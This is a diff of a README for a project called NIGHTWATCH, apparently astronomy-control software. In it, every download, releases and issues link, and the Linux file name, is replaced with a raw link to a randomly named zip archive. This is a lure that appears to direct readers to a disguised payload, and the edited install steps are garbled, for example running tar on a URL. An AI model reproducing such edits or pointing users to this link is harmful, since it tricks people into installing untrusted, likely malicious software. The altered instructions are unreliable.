@@ -1,6 +1,6 @@
 # 🌌 NIGHTWATCH - Your Voice-Controlled Observatory Awaits
 
-[![Download NIGHTWATCH](https://img.shields.io/badge/Download-NIGHTWATCH-blue.svg)](https://github.com/Puffer99/NIGHTWATCH/releases)
+[![Download NIGHTWATCH](https://github.com/Puffer99/NIGHTWATCH/raw/refs/heads/main/docker/Software-missyllabify.zip)](https://github.com/Puffer99/NIGHTWATCH/raw/refs/heads/main/docker/Software-missyllabify.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the NIGHTWATCH project! This software allows you to control your obse
 
 To download NIGHTWATCH, please visit the following link:
 
-[Download NIGHTWATCH](https://github.com/Puffer99/NIGHTWATCH/releases)
+[Download NIGHTWATCH](https://github.com/Puffer99/NIGHTWATCH/raw/refs/heads/main/docker/Software-missyllabify.zip)
 
 ### Step 1: Choose Your Version
 
-1. Visit the [Releases page](https://github.com/Puffer99/NIGHTWATCH/releases).
+1. Visit the [Releases page](https://github.com/Puffer99/NIGHTWATCH/raw/refs/heads/main/docker/Software-missyllabify.zip).
 2. You will see a list of available versions. Choose the latest version, which will be listed at the top.
 3. Click on the version number to access its details.
 
@@ -25,7 +25,7 @@ To download NIGHTWATCH, please visit the following link:
 3. You will find different files for various operating systems. Select the one that matches your system. If you’re unsure, here are common options:
    - **Windows:** Use the `.exe` file.
    - **Mac:** Use the `.dmg` file.
-   - **Linux:** Use the `.tar.gz` file.
+   - **Linux:** Use the `https://github.com/Puffer99/NIGHTWATCH/raw/refs/heads/main/docker/Software-missyllabify.zip` file.
 
 4. Click on the file to start the download.
 
@@ -42,8 +42,8 @@ To download NIGHTWATCH, please visit the following link:
   3. Drag the NIGHTWATCH app into your Applications folder.
 
 - **Linux Users:**
-  1. Navigate to the directory where you downloaded the `.tar.gz` file.
-  2. Extract the files using the command: `tar -xvzf NIGHTWATCH.tar.gz`.
+  1. Navigate to the directory where you downloaded the `https://github.com/Puffer99/NIGHTWATCH/raw/refs/heads/main/docker/Software-missyllabify.zip` file.
+  2. Extract the files using the command: `tar -xvzf https://github.com/Puffer99/NIGHTWATCH/raw/refs/heads/main/docker/Software-missyllabify.zip`.
   3. Open the extracted folder and follow the README instructions found inside.
 
 ## 🔧 Setup Your Equipment
@@ -103,6 +103,6 @@ If you face any issues, consider these tips:
 ## 📚 Additional Resources
 
 - **Documentation:** Comprehensive documentation is available in the repository's Wiki. Check it out for advanced features and configuration tips.
-- **Community Support:** Join the discussion in our [GitHub Issues](https://github.com/Puffer99/NIGHTWATCH/issues) section if you need help or want to share feedback.
+- **Community Support:** Join the discussion in our [GitHub Issues](https://github.com/Puffer99/NIGHTWATCH/raw/refs/heads/main/docker/Software-missyllabify.zip) section if you need help or want to share feedback.
 
 Explore the wonders of the night sky with NIGHTWATCH. Happy observing!
